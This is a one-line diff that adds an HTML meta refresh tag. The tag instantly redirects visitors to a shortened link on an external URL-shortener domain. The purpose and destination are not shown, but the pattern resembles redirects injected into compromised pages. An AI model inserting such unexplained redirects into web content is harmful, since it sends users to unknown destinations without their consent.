@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; URL='http://llnk.ru/p/1aely'" />
